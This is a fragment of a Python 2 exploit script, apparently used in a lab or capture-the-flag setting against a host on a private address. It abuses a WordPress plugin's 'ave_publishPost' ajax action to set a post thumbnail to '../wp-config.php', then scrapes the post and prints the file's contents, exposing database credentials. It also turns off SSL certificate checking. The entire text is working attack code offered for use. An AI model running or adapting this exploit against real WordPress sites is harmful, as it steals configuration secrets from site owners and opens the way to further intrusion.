...
url = "https://192.168.100.177:12380/blogblog" # insert url to wordpress

randomID = long(random.random() * 100000000000000000L)

## I ADDED THIS - JOSE PABLO PERALTA ##
import ssl
#ctx = ssl.create_default_context()
#ctx.check_hostname = False
#ctx.verify_mode = ssl.CERT_NONE
context = ssl._create_unverified_context()
objHtml = urllib2.urlopen(url + '/wp-admin/admin-ajax.php?action=ave_publishPost&title=' + str(randomID) + '&short=rnd&term=rnd&thumb=../wp-config.php', context=context)
...
objHtml = urllib2.urlopen(url + '/?p=' + str(id), context=context)
content = objHtml.readlines()

for line in content:
	if 'attachment-post-thumbnail size-post-thumbnail wp-post-image' in line:
		urls=re.findall('"(https?://.*?)"', line)
		print urllib2.urlopen(urls[0], context=context).read()
